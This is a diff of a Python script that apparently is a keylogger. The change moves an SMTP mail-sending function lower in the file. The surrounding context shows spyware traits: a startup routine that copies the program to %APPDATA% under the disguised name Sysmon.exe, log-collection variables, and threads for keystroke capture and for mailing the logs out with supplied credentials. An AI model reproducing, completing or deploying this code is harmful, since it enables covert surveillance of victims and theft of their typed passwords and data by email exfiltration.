@@ -13,25 +13,6 @@ logdata = ''
 timereport = time.ctime()
 firstreport = 0
 
-def sendmailg(gserver , gport ,guser, gpass , mailfrom , mailto , subject , msg , ishtml = 0):
-	mailmsg = email.message.Message()
-	mailmsg['From'] = mailfrom
-	mailmsg['To'] = mailto
-	mailmsg['Subject'] = subject
-
-	if ishtml == 1:
-		mailmsg.add_header('Content-Type','text/html')
-	else:
-		mailmsg.add_header('Content-Type','text/plain')
-
-	mailmsg.set_payload (msg, 'utf-8')
-	with SMTP(gserver , gport)  as smtp:
-		smtp.ehlo()
-		smtp.starttls()
-		smtp.login(guser, gpass)
-		smtp.sendmail(mailfrom, mailto,mailmsg.as_string())
-		smtp.quit()
-
 def startup():
 	dirapp = os.path.expanduser(os.getenv("APPDATA")) + "\\Sysmon.exe"
 	if not os.path.exists(dirapp): 
@@ -91,6 +72,25 @@ def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
 	kthread.join()
 	wtthread.join()
 	mailthread.join()
+
+def sendmailg(gserver , gport ,guser, gpass , mailfrom , mailto , subject , msg , ishtml = 0):
+	mailmsg = email.message.Message()
+	mailmsg['From'] = mailfrom
+	mailmsg['To'] = mailto
+	mailmsg['Subject'] = subject
+
+	if ishtml == 1:
+		mailmsg.add_header('Content-Type','text/html')
+	else:
+		mailmsg.add_header('Content-Type','text/plain')
+
+	mailmsg.set_payload (msg, 'utf-8')
+	with SMTP(gserver , gport)  as smtp:
+		smtp.ehlo()
+		smtp.starttls()
+		smtp.login(guser, gpass)
+		smtp.sendmail(mailfrom, mailto,mailmsg.as_string())
+		smtp.quit()
 
 interval = 2
 gserver = ''
